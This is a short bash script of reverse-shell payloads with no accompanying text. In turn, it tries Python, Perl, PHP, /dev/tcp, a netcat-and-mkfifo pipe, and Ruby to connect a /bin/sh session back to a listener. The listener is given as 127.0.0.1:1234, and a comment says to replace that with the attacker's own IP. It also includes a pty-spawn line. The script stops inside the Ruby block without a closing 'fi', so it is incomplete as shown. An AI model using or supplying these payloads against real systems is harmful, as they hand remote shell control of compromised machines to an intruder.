#!/bin/bash
## Note : Replace 127.0.0.1 with your machine's IP#########

###Script for spawning a shell############
python3 -c 'import pty;pty.spawn("/bin/bash")'

if command -v python > /dev/null 2>&1; then
	python -c 'import socket,subprocess,os; 
                          sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
                          sock.connect(("127.0.0.1",1234)); 
                          os.dup2(sock.fileno(),0); 
                          os.dup2(sock.fileno(),1); 
                          os.dup2(sock.fileno(),2);
		      p = subprocess.call(["/bin/sh","-i"]);'
	exit;
fi

if command -v perl > /dev/null 2>&1; then
	perl -e 'use Socket; 
		  $i="127.0.0.1";
                      $p=1234; 
                      socket(S,PF_INET,SOCK_STREAM,GETPROTOBYNAME("tcp"));
		  if(connect(S,sockaddr_in($p,inet_aton($i))))
		  {      open(STDIN,">&S");
			open(STDOUT,">&S");
			open(STDERR,">&S");
			exec("/bin/sh -i");
		  };'
	exit;
fi

if command -v php > /dev/null 2>&1; then
	php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
          exit;
fi

if command -v sh > /dev/null 2>&1; then
	/bin/sh -i >& /dev/tcp/127.0.0.1/1234 0>&1
	exit;
fi

if command -v nc > /dev/null 2>&1; then
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 > /tmp/f
	exit;
fi

if command -v ruby > /dev/null 2>&1; then
	ruby -rsocket -e 'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d 2>&%d",f,f,f)'
	exit;